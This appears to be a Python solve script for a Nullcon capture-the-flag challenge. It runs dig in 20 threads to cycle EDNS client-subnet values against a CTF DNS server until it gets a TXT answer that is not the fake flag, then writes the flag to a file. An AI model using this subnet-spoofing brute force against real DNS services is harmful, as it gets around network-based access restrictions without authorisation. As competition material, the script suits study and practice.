#!/usr/bin/env python3
import subprocess
import threading

SERVER = "52.59.124.14"
PORT = "5053"
DOMAIN = "flag.ctf.nullcon.net"

# Server IP based ranges
base_ip = "52.59.124"
ranges = []
for i in range(256):
    ranges.append(f"{base_ip}.{i}")
    ranges.append(f"192.168.{i}.1")
    ranges.append(f"172.{i}.0.1")
    ranges.append(f"10.{i}.0.1")

def check_subnet(subnet):
    cmd = ["dig", f"@{SERVER}", "-p", PORT, "+short", "TXT", DOMAIN, f"+subnet={subnet}"]
    try:
        output = subprocess.check_output(cmd, timeout=2).decode('utf-8').strip()
        if output and "FAKEFLAG" not in output:
             print(f"!!! FOUND with {subnet}: {output}")
             with open("dragonflies_flag.txt", "w") as f:
                 f.write(output)
             return True
    except:
        pass
    return False

def worker(ranges):
    for r in ranges:
        if check_subnet(r):
            break

# Threading
threads = []
chunk_size = len(ranges) // 20
for i in range(20):
    start = i * chunk_size
    end = start + chunk_size if i < 19 else len(ranges)
    t = threading.Thread(target=worker, args=(ranges[start:end],))
    t.start()
    threads.append(t)

for t in threads:
    t.join()
